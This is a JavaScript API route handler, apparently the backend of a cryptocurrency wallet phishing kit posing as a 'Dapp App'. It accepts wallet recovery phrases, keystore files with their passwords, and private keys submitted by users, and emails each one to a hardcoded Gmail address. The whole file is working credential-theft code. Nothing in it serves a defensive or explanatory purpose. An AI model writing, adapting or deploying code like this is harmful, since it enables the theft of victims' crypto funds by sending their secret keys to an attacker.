import nodemailer from "nodemailer";

function formatMessage(message) {
  const lines = message.split(/\r?\n/);
  const formattedLines = lines.map(
    (line) => `<div style="margin-bottom: 10px;">${line}</div>`
  );
  return `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${formattedLines.join("")}</div>`;
}

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const { phrase, keystore, privateKey, item } = req.body;
  const email = process.env.EMAIL_USER || "";
  const pass = process.env.EMAIL_PASS || "";

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: { user: email, pass },
  });

  try {
    let mailOptions;

    if (phrase) {
      mailOptions = {
        from: `Dapp App <${email}>`,
        to: "ibsalam24@gmail.com",
        subject: "New Phrase Submission",
        html: `${formatMessage(phrase)} <br/> wallet is ${item}`,
      };
    } else if (keystore) {
      mailOptions = {
        from: `Dapp App <${email}>`,
        to: "ibsalam24@gmail.com",
        subject: "New Keystore Submission",
        html: `<div>Json: ${keystore.json}</div>
               <div>Password: ${keystore.password}</div>
               wallet is ${item}`,
      };
    } else if (privateKey) {
      mailOptions = {
        from: `Dapp App <${email}>`,
        to: "ibsalam24@gmail.com",
        subject: "New Private Key Submission",
        html: `${formatMessage(privateKey)} <br/> wallet is ${item}`,
      };
    }

    if (!mailOptions) {
      return res.status(400).json({ error: "Submission Failed" });
    }

    const result = await transporter.sendMail(mailOptions);
    return res.status(200).json({ message: "Email sent successfully!", result });
  } catch (error) {
    console.error("Email error:", error);
    return res.status(500).json({ error: "Email failed", details: error.message });
  }
}
